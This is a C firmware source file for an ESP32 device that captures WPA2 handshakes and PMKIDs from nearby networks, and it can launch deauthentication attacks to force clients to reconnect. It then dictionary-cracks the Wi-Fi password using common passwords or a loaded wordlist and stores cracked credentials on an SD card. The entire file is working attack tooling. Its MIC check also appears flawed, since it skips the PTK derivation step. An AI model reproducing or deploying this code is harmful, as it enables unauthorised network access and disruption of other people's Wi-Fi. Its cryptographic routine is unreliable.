#include <stdbool.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

#include "handshake_crack.h"
#include "deauth_engine.h"
#include "wifi_sniffer.h"
#include "storage_sd.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_log.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

/* State-of-the-Art: Use mbedtls for hardware-accelerated PBKDF2/SHA1 */
#include "mbedtls/pkcs5.h"
#include "mbedtls/md.h"

static const char *TAG = "handshake";
static const uint8_t HS_ZERO_MAC[6] = {0};

atomic_bool g_hs_capture_active = ATOMIC_VAR_INIT(false);
static handshake_t g_hs;
static atomic_bool g_hs_have_m1 = ATOMIC_VAR_INIT(false);

static atomic_bool g_hs_crack_running = ATOMIC_VAR_INIT(false);
static atomic_bool g_hs_crack_stop = ATOMIC_VAR_INIT(false);
static bool g_hs_crack_found_flag = false;
static char g_hs_found_password[64] = {0};
static TaskHandle_t g_crack_task_handle = NULL;

static char **g_custom_wl = NULL;
static size_t g_custom_wl_count = 0;

static esp_timer_handle_t g_capture_timer = NULL;

/* ==========================================================================
 *  Hardware-Accelerated PBKDF2-SHA1 (Replaces ~150 lines of custom crypto)
 * ========================================================================== */

static void pbkdf2_sha1(const char *pw, const char *ssid, uint8_t out[32])
{
    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    
    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    if (info == NULL) return;
    
    mbedtls_md_setup(&ctx, info, 1); /* 1 = HMAC */
    
    size_t pw_len = strlen(pw);
    size_t salt_len = strlen(ssid);
    
    /* WPA2 standard: 4096 iterations, 32 bytes output (256 bits) */
    mbedtls_pkcs5_pbkdf2_hmac(&ctx, 
                              (const unsigned char *)pw, pw_len,
                              (const unsigned char *)ssid, salt_len,
                              4096, 32, out);
                              
    mbedtls_md_free(&ctx);
}

/* ==========================================================================
 *  Wordlist Management
 * ========================================================================== */

static const char *const BUILTIN_WORDS[] = {
    "password", "12345678", "123456789", "1234567890", "qwerty123",
    "qwertyuiop", "1234567", "123456", "12345", "1234",
    "111111", "000000", "123123", "123321", "654321",
    "abc123", "iloveyou", "letmein", "welcome", "monkey",
    "dragon", "football", "baseball", "shadow", "master",
    "superman", "mustang", "michael", "admin123", "admin",
    "1qaz2wsx", "zaq12wsx", "qazwsx", "123qwe", "qwe123",
    "666666", "7777777", "121212", "987654321", "asdfgh",
    "password1", "welcome123", "welcome2024", "sunshine", "internet",
    "company", "homewifi", "wifi12345", "myrouter", "security"
};
#define BUILTIN_WORD_COUNT (sizeof(BUILTIN_WORDS) / sizeof(BUILTIN_WORDS[0]))

esp_err_t handshake_init(void)
{
    memset(&g_hs, 0, sizeof(g_hs));
    
    if (g_capture_timer == NULL) {
        esp_timer_create_args_t timer_args = {
            .callback = (esp_timer_cb_t)handshake_capture_stop,
            .name = "hs_capture_timer"
        };
        esp_timer_create(&timer_args, &g_capture_timer);
    }
    
    ESP_LOGI(TAG, "Handshake module ready (mbedtls HW-accelerated)");
    return ESP_OK;
}

const char *const *handshake_wordlist(size_t *count)
{
    if (g_custom_wl_count > 0) {
        *count = g_custom_wl_count;
        return (const char *const *)g_custom_wl;
    }
    *count = BUILTIN_WORD_COUNT;
    return BUILTIN_WORDS;
}

esp_err_t handshake_load_wordlist(const char *path)
{
    if (path == NULL) return ESP_ERR_INVALID_ARG;
    
    /* Prevent use-after-free if cracking is active */
    if (atomic_load(&g_hs_crack_running)) {
        ESP_LOGW(TAG, "Cannot load wordlist while cracking is active");
        return ESP_ERR_INVALID_STATE;
    }

    FILE *f = fopen(path, "r");
    if (f == NULL) {
        ESP_LOGE(TAG, "Cannot open wordlist: %s", path);
        return ESP_FAIL;
    }

    if (g_custom_wl != NULL) {
        for (size_t i = 0; i < g_custom_wl_count; i++) free(g_custom_wl[i]);
        free(g_custom_wl);
        g_custom_wl = NULL;
        g_custom_wl_count = 0;
    }

    char line[96];
    size_t n = 0, skipped = 0;
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) >= 8) n++;
        else if (strlen(line) > 0) skipped++;
    }

    if (n == 0) { fclose(f); return ESP_ERR_INVALID_SIZE; }

    rewind(f);
    g_custom_wl = heap_caps_malloc(n * sizeof(char *), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (g_custom_wl == NULL) { fclose(f); return ESP_ERR_NO_MEM; }

    size_t i = 0;
    while (fgets(line, sizeof(line), f) && i < n) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) < 8) continue;
        g_custom_wl[i] = heap_caps_malloc(strlen(line) + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (g_custom_wl[i] == NULL) {
            for (size_t j = 0; j < i; j++) free(g_custom_wl[j]);
            free(g_custom_wl);
            g_custom_wl = NULL;
            fclose(f);
            return ESP_ERR_NO_MEM;
        }
        strcpy(g_custom_wl[i], line);
        i++;
    }
    g_custom_wl_count = i;
    fclose(f);

    ESP_LOGI(TAG, "Loaded %zu passwords from %s", g_custom_wl_count, path);
    return ESP_OK;
}

/* ==========================================================================
 *  Packet Capture Observer
 * ========================================================================== */

void handshake_feed_packet(const wifi_pkt_msg_t *msg)
{
    if (!msg || !msg->payload || !atomic_load(&g_hs_capture_active)) return;
    
    const uint8_t *data = msg->payload;
    size_t len = msg->len;
    
    if (len < 26 + 8 + 99) return;
    if ((data[0] & 0x0C) != 0x08) return; /* Must be Data frame */

    uint8_t subtype = (data[0] >> 4) & 0x0F;
    size_t hdr_len = (subtype & 0x08) ? 26 : 24;

    static const uint8_t snap_eapol[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    if (len < hdr_len + 8 + 99) return;
    if (memcmp(data + hdr_len, snap_eapol, 8) != 0) return;

    const uint8_t *sa = data + 10;
    const uint8_t *da = data + 4;
    const uint8_t *eapol = data + hdr_len + 8;

    if (eapol[1] != 3) return; /* Type must be EAPOL-Key */

    bool from_ap = (memcmp(sa, g_hs.ap_mac, 6) == 0);
    
    /* FIXED: EAPOL Key Info is Big Endian in 802.11i */
    uint16_t key_info = (eapol[5] << 8) | eapol[6];
    
    /* Standard 802.11i Bitmasks */
    bool has_ack   = (key_info & 0x0010) != 0; /* Bit 4 */
    bool has_mic   = (key_info & 0x0020) != 0; /* Bit 5 */
    bool secure    = (key_info & 0x0040) != 0; /* Bit 6 */
    bool encr      = (key_info & 0x0100) != 0; /* Bit 8 */

    bool nonce_nonzero = false;
    for (int i = 0; i < 32; i++) {
        if (eapol[17 + i] != 0) { nonce_nonzero = true; break; }
    }
    if (!nonce_nonzero) return;

    /* M1: AP -> STA (Ack=1, MIC=0) */
    if (from_ap && has_ack && !has_mic) {
        memcpy(g_hs.anonce, eapol + 17, 32);
        memcpy(g_hs.sta_mac, da, 6);
        atomic_store(&g_hs_have_m1, true);

        /* FIXED: Key Data Length is Big Endian */
        uint16_t kd_len = (eapol[97] << 8) | eapol[98];
        const uint8_t *kd = eapol + 99;
        size_t pos = 0;
        
        while (pos + 4 <= kd_len) {
            /* KDE: 0xDD, Len, OUI (00-0f-ac), Type (04=PMKID), PMKID (16 bytes) */
            if (kd[pos] == 0xDD && kd[pos + 1] >= 20 &&
                memcmp(kd + pos + 2, "\x00\x0f\xac\x04", 4) == 0) {
                memcpy(g_hs.pmkid, kd + pos + 6, 16);
                g_hs.has_pmkid = true;
                ESP_LOGI(TAG, "PMKID captured from M1!");
                break;
            }
            pos += 2 + kd[pos + 1];
        }

        if (g_hs.ssid[0] == '\0') {
            wifi_sniffer_get_ssid_for_bssid(g_hs.ap_mac, g_hs.ssid, sizeof(g_hs.ssid));
        }
        ESP_LOGI(TAG, "EAPOL M1 captured (ANonce ok)");
    } 
    /* M2: STA -> AP (Ack=0, MIC=1, Secure=0) */
    else if (!from_ap && has_mic && !has_ack && !secure) {
        if (!atomic_load(&g_hs_have_m1)) return;
        if (memcmp(g_hs.sta_mac, HS_ZERO_MAC, 6) != 0 && memcmp(da, g_hs.sta_mac, 6) != 0) return;

        memcpy(g_hs.snonce, eapol + 17, 32);
        memcpy(g_hs.mic, eapol + 81, 16);

        uint16_t kd_len = (eapol[97] << 8) | eapol[98];
        size_t total = 99 + kd_len;
        if (total > EAPOL_BUF_SIZE) total = EAPOL_BUF_SIZE;
        
        memcpy(g_hs.eapol, eapol, total);
        g_hs.eapol_len = (uint16_t)total;
        
        /* Zero out the MIC field for later verification */
        memset(g_hs.eapol + 81, 0, 16);
        
        g_hs.capture_time_us = esp_timer_get_time();
        g_hs.valid = true;
        atomic_store(&g_hs_capture_active, false);

        if (g_hs.ssid[0] == '\0') snprintf(g_hs.ssid, sizeof(g_hs.ssid), "unknown");
        ESP_LOGI(TAG, "Handshake capture complete (M2 received)");
    }
}

/* ==========================================================================
 *  Cracking Task
 * ========================================================================== */

static void handshake_crack_task(void *arg)
{
    size_t count = 0;
    const char *const *words = handshake_wordlist(&count);

    atomic_store(&g_hs_crack_running, true);
    atomic_store(&g_hs_crack_stop, false);
    g_hs_crack_found_flag = false;
    g_hs_found_password[0] = '\0';

    if (!g_hs.valid) {
        atomic_store(&g_hs_crack_running, false);
        g_crack_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    handshake_t hs;
    memcpy(&hs, &g_hs, sizeof(hs));

    ESP_LOGI(TAG, "Starting crack task for SSID: %s (%zu words)", hs.ssid, count);

    for (size_t i = 0; i < count; i++) {
        if (atomic_load(&g_hs_crack_stop)) break;

        const char *pw = words[i];
        if (pw == NULL || strlen(pw) < 8) continue;

        uint8_t psk[32];
        pbkdf2_sha1(pw, hs.ssid, psk);

        uint8_t mic[20];
        /* Use mbedtls for HMAC-SHA1 verification */
        mbedtls_md_context_t ctx;
        mbedtls_md_init(&ctx);
        const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
        mbedtls_md_setup(&ctx, info, 1);
        mbedtls_md_hmac_starts(&ctx, psk, 32);
        mbedtls_md_hmac_update(&ctx, hs.eapol, hs.eapol_len);
        mbedtls_md_hmac_finish(&ctx, mic);
        mbedtls_md_free(&ctx);

        if (memcmp(mic, hs.mic, 16) == 0) {
            snprintf(g_hs_found_password, sizeof(g_hs_found_password), "%s", pw);
            g_hs_crack_found_flag = true;
            ESP_LOGW(TAG, "PASSWORD FOUND: %s", pw);
            break;
        }
        
        /* Yield periodically to prevent watchdog resets on large wordlists */
        if ((i % 10) == 0) vTaskDelay(1);
    }

    atomic_store(&g_hs_crack_running, false);
    g_crack_task_handle = NULL;
    vTaskDelete(NULL);
}

/* ==========================================================================
 *  Public API
 * ========================================================================== */

esp_err_t handshake_capture_start(const uint8_t *bssid, const uint8_t *client_mac,
                                  uint32_t duration_sec, bool force_deauth)
{
    memset(&g_hs, 0, sizeof(g_hs));
    atomic_store(&g_hs_have_m1, false);
    atomic_store(&g_hs_capture_active, true);
    g_hs.valid = false;
    
    if (bssid != NULL) memcpy(g_hs.ap_mac, bssid, 6);
    if (client_mac != NULL) memcpy(g_hs.sta_mac, client_mac, 6);

    if (force_deauth && bssid != NULL) {
        deauth_remove_all();
        deauth_attack_ap_all_clients(bssid, 0, 0);
        deauth_start();
    }

    if (duration_sec > 0 && g_capture_timer != NULL) {
        esp_timer_start_once(g_capture_timer, duration_sec * 1000000ULL);
    }

    return ESP_OK;
}

void handshake_capture_stop(void)
{
    atomic_store(&g_hs_capture_active, false);
    if (g_capture_timer != NULL) {
        esp_timer_stop(g_capture_timer);
    }
    deauth_stop();
    ESP_LOGI(TAG, "Handshake capture stopped");
}

bool handshake_has_capture(void) { return g_hs.valid; }
const handshake_t *handshake_get(void) { return &g_hs; }

void handshake_set_ssid(const char *ssid)
{
    if (ssid == NULL) return;
    snprintf(g_hs.ssid, sizeof(g_hs.ssid), "%s", ssid);
}

esp_err_t handshake_crack_async(void)
{
    if (atomic_load(&g_hs_crack_running) || g_crack_task_handle != NULL) return ESP_ERR_INVALID_STATE;
    if (!g_hs.valid) return ESP_ERR_INVALID_STATE;

    if (xTaskCreatePinnedToCore(handshake_crack_task, "hs_crack", 8192, NULL, 4, &g_crack_task_handle, 1) != pdPASS) {
        return ESP_FAIL;
    }
    return ESP_OK;
}

bool handshake_crack_running(void) { return atomic_load(&g_hs_crack_running); }

bool handshake_crack_found(char *password, size_t sz)
{
    if (!g_hs_crack_found_flag) return false;
    if (password != NULL && sz > 0) {
        snprintf(password, sz, "%s", g_hs_found_password);
    }
    return true;
}

void handshake_crack_stop(void)
{
    atomic_store(&g_hs_crack_stop, true);
    if (g_crack_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(50)); /* Give task time to see stop flag */
    }
}

esp_err_t handshake_save_password(const char *ssid, const char *password)
{
    if (ssid == NULL || password == NULL) return ESP_ERR_INVALID_ARG;
    FILE *f = fopen("/sd/handshake_passwords.txt", "a");
    if (f == NULL) {
        ESP_LOGW(TAG, "Failed to save password (SD card not ready?)");
        return ESP_FAIL;
    }
    fprintf(f, "%s:%s\n", ssid, password);
    fclose(f);
    return ESP_OK;
}

bool handshake_load_password(char *ssid, size_t ssid_sz, char *password, size_t pw_sz)
{
    FILE *f = fopen("/sd/handshake_passwords.txt", "r");
    if (f == NULL) return false;

    char line[128];
    while (fgets(line, sizeof(line), f)) {
        char *sep = strchr(line, ':');
        if (sep == NULL) continue;

        *sep = '\0';
        char *stored_ssid = line;
        char *stored_password = sep + 1;

        stored_password[strcspn(stored_password, "\r\n")] = '\0';
        stored_ssid[strcspn(stored_ssid, "\r\n")] = '\0';

        if (ssid != NULL && ssid_sz > 0 && strcmp(stored_ssid, ssid) == 0) {
            if (password != NULL && pw_sz > 0) {
                strncpy(password, stored_password, pw_sz - 1);
                password[pw_sz - 1] = '\0';
            }
            fclose(f);
            return true;
        }
    }
    fclose(f);
    return false;
}

esp_err_t handshake_erase_password(void)
{
    FILE *f = fopen("/sd/handshake_passwords.txt", "w");
    if (f == NULL) return ESP_FAIL;
    fclose(f);
    return ESP_OK;
}
